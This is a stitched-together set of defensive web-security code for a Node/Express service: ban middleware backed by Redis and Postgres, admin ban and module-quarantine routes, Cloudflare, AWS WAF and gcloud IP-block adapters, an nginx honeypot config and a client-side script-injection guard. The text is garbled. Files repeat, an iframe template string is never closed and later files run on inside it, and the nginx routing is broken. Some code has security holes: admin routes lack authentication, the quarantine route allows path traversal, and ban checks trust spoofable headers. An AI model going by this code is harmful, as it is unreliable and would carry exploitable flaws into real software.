const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true', [type, value]);
  if (res.rowCount) {
    const ban = res.rows[0];
    const ttl = ban.expires_at ? Math.max(0, new Date(ban.expires_at) - Date.now()) : null;
    if (ttl) await redis.setEx(key, Math.ceil(ttl/1000), JSON.stringify(ban));
    else await redis.set(key, JSON.stringify(ban));
    return ban;
  }
  return null;
}

module.exports = function banMiddleware() {
  return async function (req, res, next) {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // log and block
          req.app.logger.warn({ event: 'ban_block', ip, apiKey, accountId, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }
      next();
    } catch (err) {
      next(err);
    }
  };
};
POST /admin/bans
Authorization: Bearer <admin-token>
Content-Type: application/json

{
  "subject_type":"ip",
  "subject_value":"203.0.113.45",
  "reason":"credential stuffing",
  "expires_at":"2026-03-07T12:00:00Z"
}
-- bans table
CREATE TABLE bans (
  id BIGSERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip'|'account'|'api_key'|'fingerprint'|'asn'|'tls_ja3'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  expires_at TIMESTAMPTZ NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);

-- linked identities (to correlate multiple labels to one actor)
CREATE TABLE actor_links (
  id BIGSERIAL PRIMARY KEY,
  actor_id TEXT NOT NULL, -- opaque actor id (e.g., UUID)
  label_type TEXT NOT NULL, -- 'ip'|'fingerprint'|'api_key'|'account'|'asn'|'tls_ja3'
  label_value TEXT NOT NULL,
  seen_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX ON actor_links(actor_id);
CREATE INDEX ON actor_links(label_type, label_value);
// ban-enforce.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client
const { pushToEdge } = require('./edge-integration'); // pluggable

async function redisGetBan(type, value) {
  const key = `ban:${type}:${value}`;
  const raw = await redis.get(key);
  return raw ? JSON.parse(raw) : null;
}

async function dbGetBan(type, value) {
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  return res.rowCount ? res.rows[0] : null;
}

async function isBanned(type, value) {
  const cached = await redisGetBan(type, value);
  if (cached) return cached;
  const ban = await dbGetBan(type, value);
  if (ban) {
    const key = `ban:${type}:${value}`;
    if (ban.expires_at) {
      const ttl = Math.max(0, Math.floor((new Date(ban.expires_at) - Date.now()) / 1000));
      await redis.setEx(key, ttl || 1, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

function extractLabels(req) {
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  const ua = req.get('user-agent') || '';
  const apiKey = req.get('x-api-key') || null;
  const accountId = req.user && req.user.id ? String(req.user.id) : null;
  const asn = req.get('x-forwarded-asn') || null;
  const tlsJa3 = req.get('x-ja3') || null; // requires edge to populate
  const fingerprint = req.get('x-device-fp') || null; // optional client-sent fingerprint
  return { ip, ua, apiKey, accountId, asn, tlsJa3, fingerprint };
}

module.exports = function banMiddleware(options = {}) {
  return async function (req, res, next) {
    try {
      const labels = extractLabels(req);
      // check high-confidence labels first
      const checks = [
        isBanned('ip', labels.ip),
        labels.apiKey ? isBanned('api_key', labels.apiKey) : null,
        labels.accountId ? isBanned('account', labels.accountId) : null,
        labels.fingerprint ? isBanned('fingerprint', labels.fingerprint) : null,
        labels.asn ? isBanned('asn', labels.asn) : null,
        labels.tlsJa3 ? isBanned('tls_ja3', labels.tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // optional: push to edge for immediate network block
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge(ban.subject_type, ban.subject_value).catch(() => {});
          }
          req.app.logger?.warn({ event: 'ban_block', labels, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // behavioral scoring: increment actor score and escalate if threshold reached
      const actorId = req.get('x-actor-id') || null; // optional precomputed actor id
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600); // sliding window
        if (score >= (options.behaviorThreshold || 100)) {
          // create a temporary ban and push to DB + Redis
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (options.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge('actor', actorId).catch(()=>{});
          }
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express routes)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider
  // await pushToEdge(subject_type, subject_value);
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  // remove from redis (best-effort)
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
  }
  res.json({ ok: true });
});

module.exports = router;
// edge-integration.js (stub)
async function pushToEdge(type, value) {
  // Implement provider-specific API calls here.
  // Example: Cloudflare IP list update, AWS WAF IPSet update, or call to your CDN purge/block API.
  // Keep idempotent and rate-limited.
  return Promise.resolve();
}
module.exports = { pushToEdge };
// correlate-worker.js (concept)
const db = require('./db');
async function correlate() {
  // find labels that co-occur in short windows and assign actor ids
  // pseudocode: for each recent request log, group labels and upsert actor_links
  // then merge actor_ids that share labels and update bans if necessary
}
setInterval(correlate, 60_000);
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;
      const fingerprint = req.get('x-device-fp') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // Optional behavioral scoring and auto-escalation
      const actorId = req.get('x-actor-id') || null;
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600);
        if (score >= (opts.behaviorThreshold || 100)) {
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (opts.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  if (!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp') || null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // signal edge to escalate (best-effort)
          if (opts.edge && opts.edge.notify) opts.edge.notify({ type: ban.subject_type, value: ban.subject_value, reason: ban.reason });
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      next();
    } catch (err) { next(err); }
  };
};
// edge-adapter.js (generic)
async function pushIpBlockToEdge(providerClient, ip, meta = {}) {
  // providerClient is a pluggable SDK for Cloudflare/AWS/GCP/etc.
  // Implement idempotent upsert: create or update an IP set entry and return ruleId for revocation.
  const ruleId = await providerClient.upsertIpSet({ ip, meta });
  return ruleId;
}

async function removeIpBlockFromEdge(providerClient, ruleId) {
  await providerClient.removeIpSetEntry(ruleId);
}

module.exports = { pushIpBlockToEdge, removeIpBlockFromEdge };
map $http_x_suspicious $to_honeypot {
  default 0;
  "1" 1;
}

server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://app_upstream;
  }

  location /honeypot/ {
    proxy_pass http://honeypot_upstream;
  }

  # conditional routing: if app sets header X-Suspicious: 1, rewrite to honeypot
  proxy_intercept_errors on;
  error_page 418 = @to_honeypot;
}

# In app: respond with 418 and header X-Suspicious when you want the edge to divert
// correlate-worker.js (concept)
const db = require('./db');

async function correlateRecentLogs() {
  // 1) fetch recent request logs with labels (ip, fingerprint, api_key, account)
  // 2) group by co-occurrence within short time windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached
}
setInterval(correlateRecentLogs, 60_000);
// cloudflare-adapter.js
const fetch = require('node-fetch');

class CloudflareAdapter {
  constructor({ accountId, zoneId, apiToken }) {
    this.accountId = accountId;
    this.zoneId = zoneId;
    this.apiToken = apiToken;
    this.base = 'https://api.cloudflare.com/client/v4';
  }

  headers() {
    return {
      'Authorization': `Bearer ${this.apiToken}`,
      'Content-Type': 'application/json'
    };
  }

  async upsertIpList(listName) {
    // find or create an IP list (managed by account)
    const url = `${this.base}/accounts/${this.accountId}/rules/lists`;
    const res = await fetch(`${url}?name=${encodeURIComponent(listName)}`, { headers: this.headers() });
    const j = await res.json();
    if (j.result && j.result.length) return j.result[0];
    const create = await fetch(url, {
      method: 'POST',
      headers: this.headers(),
      body: JSON.stringify({ name: listName, kind: 'ip', description: 'Managed by system' })
    });
    return (await create.json()).result;
  }

  async addIpToList(listId, ip) {
    const url = `${this.base}/accounts/${this.accountId}/rules/lists/${listId}/items`;
    // idempotent: check existing items first
    const existing = await fetch(url, { headers: this.headers() }).then(r => r.json());
    if (existing.result && existing.result.some(i => i.ip === ip)) return existing.result.find(i => i.ip === ip);
    const res = await fetch(url, {
      method: 'POST',
      headers: this.headers(),
      body: JSON.stringify([{ ip, comment: 'auto-block' }])
    });
    return (await res.json()).result[0];
  }

  async upsertFirewallRule(ruleName, listId, action = 'block') {
    // get existing rules
    const url = `${this.base}/zones/${this.zoneId}/firewall/rules`;
    const rules = await fetch(url, { headers: this.headers() }).then(r => r.json());
    const match = (rules.result || []).find(r => r.description === ruleName);
    const expression = `ip.src in $${listId}`; // Cloudflare uses lists by id reference in expressions
    const payload = { action, description: ruleName, filter: { expression } };
    if (match) {
      // update
      const res = await fetch(`${url}/${match.id}`, {
        method: 'PUT', headers: this.headers(), body: JSON.stringify(payload)
      });
      return (await res.json()).result;
    } else {
      // create
      const res = await fetch(url, {
        method: 'POST', headers: this.headers(), body: JSON.stringify([payload])
      });
      return (await res.json()).result[0];
    }
  }

  async removeIpFromList(listId, listItemId) {
    const url = `${this.base}/accounts/${this.accountId}/rules/lists/${listId}/items/${listItemId}`;
    await fetch(url, { method: 'DELETE', headers: this.headers() });
  }

  async deleteFirewallRule(ruleId) {
    const url = `${this.base}/zones/${this.zoneId}/firewall/rules/${ruleId}`;
    await fetch(url, { method: 'DELETE', headers: this.headers() });
  }
}

module.exports = CloudflareAdapter;
// aws-waf-adapter.js
const { WAFV2Client, GetIPSetCommand, CreateIPSetCommand, UpdateIPSetCommand, ListIPSetsCommand } = require('@aws-sdk/client-wafv2');

class AwsWafAdapter {
  constructor({ region, scope = 'REGIONAL' }) {
    this.client = new WAFV2Client({ region });
    this.scope = scope; // 'REGIONAL' or 'CLOUDFRONT'
  }

  async findOrCreateIpSet(name, description = '') {
    const list = await this.client.send(new ListIPSetsCommand({ Scope: this.scope }));
    const found = (list.IPSets || []).find(i => i.Name === name);
    if (found) return found;
    const res = await this.client.send(new CreateIPSetCommand({
      Name: name, Scope: this.scope, Description: description, IPAddressVersion: 'IPV4', Addresses: []
    }));
    return { Name: name, Id: res.Summary.Id, ARN: res.Summary.ARN };
  }

  async addIpToIpSet(ipSetId, addresses, lockToken) {
    // get current set, update with new addresses (idempotent)
    const get = await this.client.send(new GetIPSetCommand({ Name: ipSetId.Name, Scope: this.scope, Id: ipSetId.Id }));
    const current = new Set(get.IPSet.Addresses || []);
    addresses.forEach(a => current.add(a));
    const res = await this.client.send(new UpdateIPSetCommand({
      Name: ipSetId.Name, Scope: this.scope, Id: ipSetId.Id, Addresses: Array.from(current), LockToken: get.LockToken
    }));
    return res;
  }

  // Note: associating IPSet with WebACL requires WebACL update; implement in your deployment pipeline.
}

module.exports = AwsWafAdapter;
# create a rule to deny an IP (gcloud)
PROJECT=my-project
POLICY=my-security-policy
IP=203.0.113.45

# add a deny rule with a priority (lower number = higher priority)
gcloud compute security-policies rules create 1000 \
  --security-policy=${POLICY} \
  --expression="inIpRange(origin.ip, '${IP}')" \
  --action=deny-403 \
  --description="auto-block for malicious actor"
# remove the rule by priority
gcloud compute security-policies rules delete 1000 --security-policy=${POLICY}
/* ===== Trusted Types policy to block unsafe sinks ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('guardPolicy', {
        createHTML: () => { throw new Error('createHTML blocked'); },
        createScript: () => { throw new Error('createScript blocked'); },
        createScriptURL: () => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) { console.warn('TrustedTypes policy not created or already exists'); }
  }

  /* ===== Allowlist: module URL -> expected sha256-base64 (populate from CI in production) ===== */
  const ALLOWED_MODULES = {
    '/modules/approved-widget.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* ===== Logging helper ===== */
  function log(msg) {
    const el = document.getElementById('log');
    const t = new Date().toISOString();
    el.textContent = `[${t}] ${msg}\n` + el.textContent;
    console.log(msg);
  }

  /* ===== Compute SHA-256 base64 of ArrayBuffer ===== */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const s = document.createElement('script');
      s.type = 'module';
      s.src = blobUrl;
      s.onload = () => { URL.revokeObjectURL(blobUrl); log('Module loaded: ' + url); };
      s.onerror = (e) => { URL.revokeObjectURL(blobUrl); log('Module execution failed: ' + e); };
      document.head.appendChild(s);
    } catch (err) {
      log('Blocked module load: ' + err.message);
      document.getElementById('status').textContent = 'Blocked: ' + err.message;
    }
  }

  /* ===== MutationObserver: remove unauthorized scripts/links immediately ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) return ALLOWED_SCRIPT_SRCS.has(node.src);
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeAllowed(n)) {
          log('Removed unauthorized node: ' + (n.src || n.href || n.outerHTML.slice(0,80)));
          n.remove();
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Sandbox untrusted code in iframe and validate messages ===== */
  const sandbox = document.createElement('iframe');
  sandbox.sandbox = 'allow-scripts';
  sandbox.style.display = 'none';
  sandbox.srcdoc = `<script>window.addEventListener('message', e=>{ if(e.data && e.data.cmd==='ping') parent.postMessage({cmd:'pong',nonce:e.data.nonce}, '*'); });/* Trusted Types policy */
if (window.trustedTypes) {
  try { window.trustedTypes.createPolicy('guard', { createHTML:()=>{throw new Error('blocked')}, createScript:()=>{throw new Error('blocked')} }); }
  catch(e){ console.warn('TrustedTypes not created'); }
}

/* Allowlist: URL -> 'sha256-BASE64' (populate from CI in production) */
const ALLOWED = { '/modules/widget-v1.js': 'sha256-REPLACE_BASE64' };

/* Logging helper */
function log(msg){ const p=document.getElementById('log'); p.textContent = new Date().toISOString() + ' ' + msg + '\n' + p.textContent; console.log(msg); }

/* Compute SHA-256 base64 */
async function sha256Base64(buf){
  const h = await crypto.subtle.digest('SHA-256', buf);
  const b = String.fromCharCode(...new Uint8Array(h));
  return btoa(b);
}

/* Safe module loader: fetch -> verify -> execute as module */
async function loadModuleSafely(url){
  try{
    if(!ALLOWED[url]) throw new Error('not allowlisted');
    const r = await fetch(url, {credentials:'same-origin'});
    if(!r.ok) throw new Error('fetch failed');
    const buf = await r.arrayBuffer();
    const base64 = await sha256Base64(buf);
    if('sha256-'+base64 !== ALLOWED[url]) throw new Error('integrity mismatch');
    const blob = new Blob([buf], {type:'application/javascript'});
    const blobUrl = URL.createObjectURL(blob);
    const s = document.createElement('script'); s.type='module'; s.src = blobUrl;
    s.onload = ()=>{ URL.revokeObjectURL(blobUrl); log('module loaded: '+url); };
    s.onerror = (e)=>{ URL.revokeObjectURL(blobUrl); log('module execution failed'); };
    document.head.appendChild(s);
  }catch(e){ log('blocked module: '+e.message); reportEvent({type:'module_block', url, reason:e.message}); }
}

/* MutationObserver: remove unauthorized scripts/links */
const ALLOWED_SCRIPT_SRCS = new Set([location.origin + '/app.bundle.js']);
const observer = new MutationObserver(muts=>{
  for(const m of muts) for(const n of m.addedNodes){
    if(n.nodeType!==1) continue;
    if((n.tagName==='SCRIPT' && n.src && !ALLOWED_SCRIPT_SRCS.has(n.src)) || (n.tagName==='LINK' && n.rel==='stylesheet' && n.href && !n.href.startsWith(location.origin))){
      log('removed unauthorized node: ' + (n.src||n.href||n.outerHTML.slice(0,80)));
      n.remove();
      reportEvent({type:'injection_removed', node: n.src||n.href||n.tagName});
    }
  }
});
observer.observe(document.documentElement, {childList:true, subtree:true});

/* Sandbox iframe for untrusted code */
const iframe = document.createElement('iframe'); iframe.sandbox='allow-scripts'; iframe.style.display='none';
iframe.srcdoc = `<script>window.addEventListener('message',e=>{ if(e.data&&e.data.cmd==='ping') parent.postMessage({cmd:'pong',nonce:e.data.nonce}, '*'); });
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value){
  if(!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if(cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',[type,value]);
  if(res.rowCount){ const ban=res.rows[0]; if(ban.expires_at){ const ttl=Math.max(1,Math.floor((new Date(ban.expires_at)-Date.now())/1000)); await redis.setEx(key,ttl,JSON.stringify(ban)); } else await redis.set(key,JSON.stringify(ban)); return ban; }
  return null;
}

module.exports = function banMiddleware(){
  return async (req,res,next)=>{
    try{
      const ip = (req.headers['x-forwarded-for']||req.ip||'').split(',')[0].trim();
      const apiKey = req.get('x-api-key')||null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp')||null;
      const checks = [ isBanned('ip',ip), apiKey?isBanned('api_key',apiKey):null, accountId?isBanned('account',accountId):null, fingerprint?isBanned('fingerprint',fingerprint):null ].filter(Boolean);
      for(const p of checks){ const ban = await p; if(ban){ req.app.logger?.warn({event:'ban_block', ip, apiKey, accountId, fingerprint, ban}); return res.status(403).json({error:'Access denied', reason:ban.reason||'restricted'}); } }
      next();
    }catch(err){ next(err); }
  };
};
// admin-modules.js (Express routes)
const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const db = require('./db'); // your DB client

// Delete module file and record audit
router.post('/admin/modules/delete', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if (!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    // audit record
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'delete_requested', adminId, reason || null]);
    // remove file (or move to quarantine)
    const quarantine = '/var/quarantine/modules';
    fs.mkdirSync(quarantine, { recursive: true });
    const dest = path.join(quarantine, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // invalidate caches / CDN purge (call provider API here)
    res.json({ ok: true, quarantined: dest });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'failed' });
  }
});

module.exports = router;
# fail if any file in /dist/modules is not in allowlist.txt
for f in dist/modules/*.js; do basename "$f" | grep -Fxq "$(basename "$f")" allowlist.txt || { echo "Unknown module $f"; exit 1; }; done
// loadModuleSafely.js (client)
const ALLOWED_MODULES = { '/modules/widget-v1.js': 'sha256-BASE64HASH' };

async function sha256Base64(buf){
  const h = await crypto.subtle.digest('SHA-256', buf);
  return btoa(String.fromCharCode(...new Uint8Array(h)));
}

async function loadModuleSafely(url){
  if(!ALLOWED_MODULES[url]) throw new Error('Not allowlisted');
  const r = await fetch(url, { credentials:'same-origin' });
  if(!r.ok) throw new Error('Fetch failed');
  const buf = await r.arrayBuffer();
  const base64 = await sha256Base64(buf);
  if('sha256-'+base64 !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type:'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const s = document.createElement('script'); s.type='module'; s.src = blobUrl;
  s.onload = () => URL.revokeObjectURL(blobUrl);
  document.head.appendChild(s);
}
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // TODO: call CDN purge API here
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;

// correlate-worker.js (concept)
const db = require('./db');

async function correlate() {
  // 1) fetch recent request logs with labels
